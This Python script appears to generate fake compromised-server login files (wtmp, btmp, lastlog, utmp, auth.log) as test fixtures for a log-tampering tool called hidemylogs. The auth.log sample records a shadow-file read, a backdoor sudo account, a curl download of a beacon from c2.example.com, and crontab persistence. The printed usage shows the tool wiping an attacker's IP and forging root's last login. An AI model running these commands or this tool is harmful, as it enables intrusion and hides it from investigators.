#!/usr/bin/env python3
"""
Generate sample log files for testing hidemylogs.

Creates a complete set of authentication log files representing a
compromised server scenario: lastlog, utmp, wtmp, btmp, and auth.log.

The scenario:
    - Normal admin activity from internal IPs during business hours
    - Attacker brute-forces SSH from Tor exit node 185.220.101.34
    - Root compromised, backdoor account created (svc-backup)
    - Lateral movement via second Tor node 45.153.160.140
    - C2 beacon downloaded, persistence via crontab

Usage:
    python3 scripts/generate_samples.py
"""

import struct
import os
from datetime import datetime

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SAMPLES_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "samples")

# lastlog: 292 bytes per record (uint32 + char[32] + char[256])
LASTLOG_FMT = "I32s256s"
LASTLOG_SIZE = struct.calcsize(LASTLOG_FMT)

# utmp/wtmp/btmp: 384 bytes per record
UTMP_FMT = "hhi32s4s32s256shhiii4I20s"
UTMP_SIZE = struct.calcsize(UTMP_FMT)
UT_USER_PROCESS = 7
UT_DEAD_PROCESS = 8


def ts(date_str):
    return int(datetime.strptime(date_str, "%Y-%m-%d %H:%M").timestamp())


def make_lastlog(timestamp, tty, host):
    return struct.pack(
        LASTLOG_FMT,
        timestamp,
        tty.encode().ljust(32, b'\x00')[:32],
        host.encode().ljust(256, b'\x00')[:256],
    )


def make_utmp(ut_type, pid, line, ut_id, user, host, tv_sec):
    return struct.pack(
        UTMP_FMT,
        ut_type, 0, pid,
        line.encode().ljust(32, b'\x00')[:32],
        ut_id.encode().ljust(4, b'\x00')[:4],
        user.encode().ljust(32, b'\x00')[:32],
        host.encode().ljust(256, b'\x00')[:256],
        0, 0, 0, tv_sec, 0,
        0, 0, 0, 0,
        b'\x00' * 20,
    )


def write_lastlog(path, records):
    max_uid = max(records.keys())
    with open(path, 'wb') as f:
        for uid in range(max_uid + 1):
            if uid in records:
                timestamp, tty, host = records[uid]
                f.write(make_lastlog(timestamp, tty, host))
            else:
                f.write(b'\x00' * LASTLOG_SIZE)


def generate():
    os.makedirs(SAMPLES_DIR, exist_ok=True)

    # === lastlog ===
    lastlog_records = {
        0:    (ts("2026-03-28 03:47"), "pts/0",  "185.220.101.34"),
        33:   (ts("2026-03-28 06:31"), "pts/1",  "185.220.101.34"),
        1000: (ts("2026-03-27 14:22"), "pts/2",  "10.0.1.101"),
        1001: (ts("2026-03-26 08:45"), "pts/3",  "10.0.1.102"),
        1002: (ts("2026-03-25 17:10"), "pts/4",  "10.0.1.103"),
        1003: (ts("2026-01-05 11:00"), "pts/5",  "10.0.1.50"),
        1005: (ts("2026-03-28 03:52"), "pts/6",  "45.153.160.140"),
        1006: (ts("2026-03-28 04:01"), "pts/7",  "185.220.101.34"),
    }
    path = os.path.join(SAMPLES_DIR, "compromised.lastlog")
    write_lastlog(path, lastlog_records)
    print(f"[+] {path} ({os.path.getsize(path)} bytes, {len(lastlog_records)} records)")

    # === wtmp ===
    wtmp_entries = [
        make_utmp(UT_USER_PROCESS, 12001, "pts/2", "ts/2", "admin", "10.0.1.101", ts("2026-03-27 14:22")),
        make_utmp(UT_DEAD_PROCESS, 12001, "pts/2", "ts/2", "", "", ts("2026-03-27 17:45")),
        make_utmp(UT_USER_PROCESS, 12050, "pts/3", "ts/3", "dev", "10.0.1.102", ts("2026-03-26 08:45")),
        make_utmp(UT_DEAD_PROCESS, 12050, "pts/3", "ts/3", "", "", ts("2026-03-26 12:30")),
        make_utmp(UT_USER_PROCESS, 31337, "pts/0", "ts/0", "root", "185.220.101.34", ts("2026-03-28 03:47")),
        make_utmp(UT_USER_PROCESS, 31338, "pts/6", "ts/6", "svc_backup", "45.153.160.140", ts("2026-03-28 03:52")),
        make_utmp(UT_DEAD_PROCESS, 31338, "pts/6", "ts/6", "", "", ts("2026-03-28 03:58")),
        make_utmp(UT_USER_PROCESS, 31339, "pts/7", "ts/7", "implant", "185.220.101.34", ts("2026-03-28 04:01")),
        make_utmp(UT_DEAD_PROCESS, 31339, "pts/7", "ts/7", "", "", ts("2026-03-28 04:14")),
    ]
    path = os.path.join(SAMPLES_DIR, "compromised.wtmp")
    with open(path, 'wb') as f:
        for entry in wtmp_entries:
            f.write(entry)
    print(f"[+] {path} ({os.path.getsize(path)} bytes, {len(wtmp_entries)} records)")

    # === utmp (current sessions) ===
    utmp_entries = [
        make_utmp(UT_USER_PROCESS, 31337, "pts/0", "ts/0", "root", "185.220.101.34", ts("2026-03-28 03:47")),
        make_utmp(UT_USER_PROCESS, 12099, "pts/2", "ts/2", "admin", "10.0.1.101", ts("2026-03-28 09:15")),
    ]
    path = os.path.join(SAMPLES_DIR, "compromised.utmp")
    with open(path, 'wb') as f:
        for entry in utmp_entries:
            f.write(entry)
    print(f"[+] {path} ({os.path.getsize(path)} bytes, {len(utmp_entries)} records)")

    # === btmp (failed logins) ===
    btmp_entries = [
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "root", "185.220.101.34", ts("2026-03-28 03:41")),
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "root", "185.220.101.34", ts("2026-03-28 03:41")),
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "root", "185.220.101.34", ts("2026-03-28 03:42")),
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "admin", "185.220.101.34", ts("2026-03-28 03:43")),
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "admin", "185.220.101.34", ts("2026-03-28 03:43")),
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "deploy", "185.220.101.34", ts("2026-03-28 03:44")),
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "www-data", "185.220.101.34", ts("2026-03-28 03:45")),
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "scanner", "171.25.193.78", ts("2026-03-29 02:10")),
        make_utmp(UT_USER_PROCESS, 0, "ssh:notty", "", "scanner", "171.25.193.78", ts("2026-03-29 02:10")),
    ]
    path = os.path.join(SAMPLES_DIR, "compromised.btmp")
    with open(path, 'wb') as f:
        for entry in btmp_entries:
            f.write(entry)
    print(f"[+] {path} ({os.path.getsize(path)} bytes, {len(btmp_entries)} records)")

    # === auth.log ===
    auth_lines = [
        "Mar 28 03:41:07 prod-web-01 sshd[4412]: Failed password for root from 185.220.101.34 port 44231 ssh2",
        "Mar 28 03:41:09 prod-web-01 sshd[4412]: Failed password for root from 185.220.101.34 port 44231 ssh2",
        "Mar 28 03:42:15 prod-web-01 sshd[4413]: Failed password for root from 185.220.101.34 port 44232 ssh2",
        "Mar 28 03:43:01 prod-web-01 sshd[4420]: Failed password for admin from 185.220.101.34 port 44240 ssh2",
        "Mar 28 03:43:33 prod-web-01 sshd[4421]: Failed password for admin from 185.220.101.34 port 44241 ssh2",
        "Mar 28 03:44:19 prod-web-01 sshd[4425]: Failed password for deploy from 185.220.101.34 port 44245 ssh2",
        "Mar 28 03:45:02 prod-web-01 sshd[4430]: Failed password for invalid user www-data from 185.220.101.34 port 44250 ssh2",
        "Mar 28 03:47:12 prod-web-01 sshd[4435]: Accepted password for root from 185.220.101.34 port 44260 ssh2",
        "Mar 28 03:47:34 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
        "Mar 28 03:48:02 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/useradd -m -s /bin/bash svc-backup",
        "Mar 28 03:48:15 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup",
        "Mar 28 03:52:44 prod-web-01 sshd[4500]: Accepted publickey for svc-backup from 45.153.160.140 port 55100 ssh2",
        "Mar 28 04:01:18 prod-web-01 sshd[4550]: Accepted publickey for implant from 185.220.101.34 port 55200 ssh2",
        "Mar 28 04:13:08 prod-web-01 sudo: svc-backup : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x https://c2.example.com/beacon",
        "Mar 28 04:13:33 prod-web-01 sudo: svc-backup : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/.x",
        "Mar 28 04:15:18 prod-web-01 sudo: svc-backup : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c echo '*/5 * * * * /tmp/.x' >> /var/spool/cron/crontabs/root",
        "Mar 28 09:15:22 prod-web-01 sshd[5100]: Accepted publickey for admin from 10.0.1.101 port 60100 ssh2",
        "Mar 29 02:10:05 prod-web-01 sshd[6001]: Failed password for invalid user scanner from 171.25.193.78 port 33100 ssh2",
        "Mar 29 02:10:08 prod-web-01 sshd[6002]: Failed password for invalid user scanner from 171.25.193.78 port 33101 ssh2",
    ]
    path = os.path.join(SAMPLES_DIR, "compromised.auth.log")
    with open(path, 'w', encoding='utf-8') as f:
        f.write("\n".join(auth_lines) + "\n")
    print(f"[+] {path} ({len(auth_lines)} lines)")

    print(f"\nDone. Test with:")
    print(f"  ./hidemylogs print -u samples/compromised.utmp -w samples/compromised.wtmp -b samples/compromised.btmp -l samples/compromised.lastlog")
    print(f"  ./hidemylogs wipe -w samples/compromised.wtmp -a 185.220.101.34 --dry-run -s w")
    print(f"  ./hidemylogs forge -l samples/compromised.lastlog --uid 0 -t '2026-03-15 09:30:00' --host 10.0.1.50 --dry-run")


if __name__ == "__main__":
    generate()
